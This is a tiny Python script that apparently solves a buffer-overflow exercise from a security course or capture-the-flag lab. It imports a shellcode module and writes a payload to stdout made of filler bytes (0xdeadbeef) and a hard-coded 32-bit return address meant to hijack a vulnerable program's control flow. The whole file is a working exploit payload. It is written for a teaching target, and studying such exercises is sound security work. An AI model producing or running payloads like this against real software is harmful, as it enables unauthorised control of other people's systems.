#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here
sys.stdout.buffer.write(pack("<III", 0xdeadbeef, 0xdeadbeef, 0x080488bc))
